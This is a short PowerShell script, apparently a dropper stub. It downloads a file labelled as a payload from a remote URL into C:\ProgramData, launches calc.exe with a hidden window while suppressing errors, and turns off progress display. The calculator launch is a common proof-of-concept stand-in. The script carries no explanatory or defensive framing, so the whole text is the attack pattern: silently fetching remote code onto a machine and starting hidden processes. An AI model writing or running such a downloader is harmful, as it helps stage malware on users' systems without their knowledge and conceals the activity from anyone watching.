
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://internal.corp/assets/update.dat',
    [string]$DropPath = "C:\ProgramData\payload.bin"
)
(New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $DropPath)
Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
$ProgressPreference = "SilentlyContinue"
